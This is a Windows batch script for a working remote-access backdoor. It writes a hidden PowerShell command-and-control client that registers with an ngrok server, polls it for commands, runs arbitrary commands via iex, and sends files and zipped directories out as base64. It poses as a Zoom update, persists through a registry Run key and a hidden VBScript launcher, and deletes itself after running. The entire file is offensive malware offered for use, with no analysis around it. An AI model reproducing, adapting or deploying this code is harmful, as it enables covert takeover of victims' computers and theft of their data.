@echo off
:: Silent Background Installer for Persistent Access
:: This script installs the backdoor as a hidden, persistent background service

:: Configuration
set "SERVER=https://thoughtless-derek-nonextinguishable.ngrok-free.dev"
set "UID=%USERNAME%-%RANDOM%"
set "VBSCRIPT=%APPDATA%\Microsoft\Windows\ZoomUpdate.vbs"
set "PSCRIPT=%APPDATA%\Microsoft\Windows\ZoomService.ps1"

:: Create PowerShell backdoor script
powershell -NoProfile -ExecutionPolicy Bypass -Command "$script = @'
$s=\"%SERVER%\"
$uid=\"%UID%\"
$info=@{user=$env:USERNAME; os=(Get-WmiObject Win32_OperatingSystem).Caption}
try { Invoke-RestMethod -Uri \"$s/api/c2/register\" -Method Post -Body (ConvertTo-Json @{uid=$uid; info=$info}) -ContentType 'application/json' -ErrorAction Stop } catch { exit }
while($true) {
    try {
        $cmd = (Invoke-RestMethod -Uri \"$s/api/c2/poll\" -Method Post -Body (ConvertTo-Json @{uid=$uid}) -ContentType 'application/json' -ErrorAction Stop).command
        if($cmd) {
            if($cmd -like '__list_files__*') {
                $path = $cmd -replace '__list_files__ ', ''
                if(-not $path) { $path = (Get-Location).Path }
                $files = Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Select-Object @{N='name';E={$_.Name}}, @{N='type';E={if($_.PSIsContainer){'dir'}else{'file'}}}, @{N='size';E={$_.Length}}
                Invoke-RestMethod -Uri \"$s/api/c2/file_list_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; files=$files; path=$path}) -ContentType 'application/json'
            } elseif($cmd -like '__download__*') {
                $file = $cmd -replace '__download__ ', ''
                $bytes = [System.IO.File]::ReadAllBytes($file)
                $b64 = [Convert]::ToBase64String($bytes)
                Invoke-RestMethod -Uri \"$s/api/c2/file_download_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; content=$b64; filename=(Split-Path $file -Leaf)}) -ContentType 'application/json'
            } elseif($cmd -like '__download_all__*') {
                $dir = $cmd -replace '__download_all__ ', ''
                if(-not $dir) { $dir = (Get-Location).Path }
                $zipPath = \"$env:TEMP\archive.zip\"
                if(Test-Path $zipPath) { Remove-Item $zipPath -Force }
                Add-Type -Assembly 'System.IO.Compression.FileSystem'
                [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zipPath)
                $bytes = [System.IO.File]::ReadAllBytes($zipPath)
                $b64 = [Convert]::ToBase64String($bytes)
                Invoke-RestMethod -Uri \"$s/api/c2/file_download_response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; content=$b64; filename='archive.zip'}) -ContentType 'application/json'
                Remove-Item $zipPath -Force
            } else {
                $out = iex $cmd 2>&1 | Out-String
                Invoke-RestMethod -Uri \"$s/api/c2/response\" -Method Post -Body (ConvertTo-Json @{uid=$uid; output=$out}) -ContentType 'application/json'
            }
        }
    } catch {}
    Start-Sleep -Seconds 2
}
'@; $script | Out-File -FilePath '%PSCRIPT%' -Encoding ASCII"

:: Create VBScript launcher (completely hidden)
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""%APPDATA%\Microsoft\Windows\ZoomService.ps1""", 0, False
) > "%VBSCRIPT%"

:: Add to startup (Registry method - more persistent)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ZoomUpdate" /t REG_SZ /d "\"%VBSCRIPT%\"" /f >nul 2>&1

:: Start immediately in hidden mode
wscript.exe "%VBSCRIPT%"

:: Clean up this installer
(goto) 2>nul & del "%~f0"
